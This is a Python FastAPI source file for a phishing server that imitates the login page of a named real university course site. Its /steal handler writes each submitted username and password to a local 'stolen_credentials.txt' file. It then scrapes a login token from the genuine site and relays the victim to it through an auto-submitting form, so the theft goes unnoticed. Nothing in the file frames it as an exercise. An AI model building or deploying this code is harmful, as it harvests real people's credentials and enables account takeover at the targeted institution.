from fastapi import FastAPI, Request, Form
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
import os
from datetime import datetime
import httpx
import re

app = FastAPI()

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

app.mount("/static", StaticFiles(directory=os.path.join(BASE_DIR, "static")), name="static")
templates = Jinja2Templates(directory=os.path.join(BASE_DIR, "templates"))

STOLEN_FILE = os.path.join(BASE_DIR, "stolen_credentials.txt")
REAL_LOGIN  = "https://e3p.nycu.edu.tw/login/index.php"


@app.get("/", response_class=HTMLResponse)
async def fake_login_page(request: Request):
    return templates.TemplateResponse("login.html", {"request": request})


@app.post("/steal")
async def steal_credentials(
    username: str = Form(...),
    password: str = Form(...)
):
    # 儲存帳密
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(STOLEN_FILE, "a") as f:
        f.write(f"[{timestamp}] username={username} | password={password}\n")

    # 從真實 E3 取得最新 logintoken
    logintoken = ""
    try:
        async with httpx.AsyncClient() as client:
            r = await client.get(REAL_LOGIN, timeout=5)
            m = re.search(r'name="logintoken"\s+value="([^"]+)"', r.text)
            if m:
                logintoken = m.group(1)
    except Exception:
        pass

    # 回傳一個自動提交的表單，讓瀏覽器直接 POST 到真實 E3
    html = f"""<!DOCTYPE html>
<html>
<body>
<form id="f" action="{REAL_LOGIN}" method="post">
  <input type="hidden" name="username"   value="{username}">
  <input type="hidden" name="password"   value="{password}">
  <input type="hidden" name="logintoken" value="{logintoken}">
  <input type="hidden" name="anchor"     value="">
</form>
<script>document.getElementById('f').submit();</script>
</body>
</html>"""
    return HTMLResponse(content=html)
